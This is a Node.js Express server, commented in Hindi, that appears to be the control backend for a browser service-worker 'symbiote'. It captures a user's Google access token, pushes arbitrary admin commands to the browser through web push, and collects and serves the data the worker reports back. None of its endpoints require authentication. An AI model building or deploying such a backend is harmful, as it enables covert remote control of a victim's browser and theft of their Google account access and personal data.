// =================================================================
// 1. आवश्यक पैकेज (Dependencies) को इम्पोर्ट करें
// =================================================================
const express = require('express');
const webpush = require('web-push');
const bodyParser = require('body-parser');
const path = require('path');

// =================================================================
// 2. सर्वर और Middleware को सेटअप करें
// =================================================================
const app = express();
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// =================================================================
// 3. VAPID कुंजियाँ (Environment Variables से)
// =================================================================
const publicVapidKey = process.env.PUBLIC_VAPID_KEY;
const privateVapidKey = process.env.PRIVATE_VAPID_KEY;

if (!publicVapidKey || !privateVapidKey) {
    console.error("VAPID कुंजियाँ परिभाषित नहीं हैं! कृपया उन्हें अपने एनवायरनमेंट वेरिएबल्स में सेट करें।");
    process.exit(1);
}

webpush.setVapidDetails('mailto:your-email@example.com', publicVapidKey, privateVapidKey);

// =================================================================
// 4. डेटा स्टोरेज (सरल संस्करण)
// =================================================================
// यहाँ हम सभी आवश्यक जानकारी को वेरिएबल्स में स्टोर कर रहे हैं।
// सर्वर रीस्टार्ट होने पर यह डेटा खो जाएगा।
let userSubscription = null;    // पुश नोटिफिकेशन के लिए यूजर का पता
let userAccessToken = null;     // गूगल डेटा एक्सेस करने के लिए चाबी
let reportedData = [];          // सर्विस वर्कर से आने वाला डेटा

// =================================================================
// 5. API रूट्स (Endpoints)
// =================================================================

// ---- रूट 1: सब्सक्रिप्शन को सहेजना ----
app.post('/subscribe', (req, res) => {
    userSubscription = req.body;
    console.log("उपयोगकर्ता ने सब्सक्राइब किया।");
    res.status(201).json({ status: 'success' });
});

// ---- रूट 2: गूगल एक्सेस टोकन को सहेजना (यह नया है!) ----
app.post('/store-token', (req, res) => {
    const { accessToken } = req.body;
    if (accessToken) {
        userAccessToken = accessToken;
        console.log("Google Access Token प्राप्त और संग्रहीत किया गया।");
        res.status(200).json({ status: 'success' });
    } else {
        console.error("कोई एक्सेस टोकन प्रदान नहीं किया गया।");
        res.status(400).json({ status: 'error', message: 'No access token provided.' });
    }
});

// ---- रूट 3: एडमिन से कमांड भेजना ----
app.post('/send-command', (req, res) => {
    const commandPayload = JSON.stringify(req.body);

    if (!userSubscription) {
        return res.status(400).json({ status: 'error', message: 'User is not subscribed.' });
    }

    console.log("कमांड भेजा जा रहा है:", commandPayload);

    webpush.sendNotification(userSubscription, commandPayload)
        .then(() => res.status(200).json({ status: 'success', message: 'Command sent successfully.' }))
        .catch(err => {
            console.error("नोटिफिकेशन भेजने में त्रुटि:", err);
            res.status(500).json({ status: 'error', message: 'Failed to send command.' });
        });
});

// ---- रूट 4: सर्विस वर्कर से डेटा प्राप्त करना ----
app.post('/report-data', (req, res) => {
    const data = req.body;
    data.timestamp = new Date().toISOString();
    reportedData.push(data);
    console.log("सिम्बायोट से डेटा प्राप्त हुआ:", data);
    res.status(200).json({ status: 'success' });
});

// ---- रूट 5: एडमिन को डेटा दिखाना ----
app.get('/get-reported-data', (req, res) => {
    res.status(200).json(reportedData);
});

// =================================================================
// 6. सर्वर को शुरू करना
// =================================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`सर्वर पोर्ट ${PORT} पर शुरू हो गया है।`);
});
